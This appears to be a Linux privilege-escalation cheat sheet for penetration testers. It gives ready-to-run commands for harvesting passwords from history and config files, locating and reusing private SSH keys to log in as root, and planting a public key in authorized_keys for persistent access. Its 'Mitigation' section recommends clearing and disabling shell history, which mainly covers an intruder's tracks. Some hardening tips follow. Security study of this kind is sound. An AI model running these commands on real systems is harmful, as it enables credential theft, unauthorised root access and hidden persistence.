# **SSH Keys, History Files & Config Files - Privilege Escalation Guide**

## **1. Credentials in History Files**
### **Common Locations**
```bash
~/.bash_history
~/.nano_history
~/.mysql_history
~/.lesshst
~/.viminfo
```

### **Exploitation**
```bash
# Check all history files
cat ~/.*history | grep -E "pass|user|root|ssh|su|sudo"

# Example finding:
mysql -h somehost.local -uroot -ppassword123  # From .bash_history
```

### **Mitigation**
```bash
# Clear your history
history -c && rm ~/.*history

# Disable history logging temporarily
unset HISTFILE
```

## **2. Config Files with Hardcoded Credentials**
### **Common Files**
```bash
/etc/openvpn/auth.txt
~/myvpn.ovpn
~/.ssh/config
/etc/mysql/my.cnf
~/.*rc files
```

### **Example Exploit**
```bash
cat /etc/openvpn/auth.txt
# Output:
root
password123

su root  # Use found credentials
```

### **Protection**
```bash
chmod 600 sensitive_configs  # Restrict access
```

## **3. SSH Key Exploitation**
### **A. Authorized Keys Attack**
```bash
# Generate key pair on attacker machine
ssh-keygen -t rsa

# Append public key to target's authorized_keys
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# SSH in without password
ssh user@target -oHostKeyAlgorithms=+ssh-rsa
```

### **B. Private Key Discovery**
```bash
# Search for private keys
find / -name "id_rsa*" -o -name "*.pem" 2>/dev/null

# Use found key
chmod 600 found_key
ssh -i found_key root@target
```

### **Example Private Key Exploit**
```bash
-----BEGIN RSA PRIVATE KEY-----
[private key contents]
-----END RSA PRIVATE KEY-----

# Usage:
chmod 600 root_key
ssh root@target -i root_key
```

## **4. Defense Strategies**
### **For System Admins**
```bash
# Secure authorized_keys
chmod 600 ~/.ssh/authorized_keys
chmod 700 ~/.ssh

# Disable root SSH login
echo "PermitRootLogin no" >> /etc/ssh/sshd_config

# Use SSH certificates instead of keys
```

### **For Penetration Testers**
```bash
# Always check:
grep -r "passw" /etc /opt /home 2>/dev/null
find / -name "*config*" -exec grep -i "pass" {} + 2>/dev/null
```

## **5. Quick Reference Table**
| Technique | Command | Impact |
|-----------|---------|--------|
| History files | `cat ~/.*history` | Find passwords/commands |
| Config files | `find / -name "*config*"` | Discover credentials |
| SSH key planting | `echo pubkey >> authorized_keys` | Persistent access |
| Private key reuse | `ssh -i found_key user@target` | Instant root |

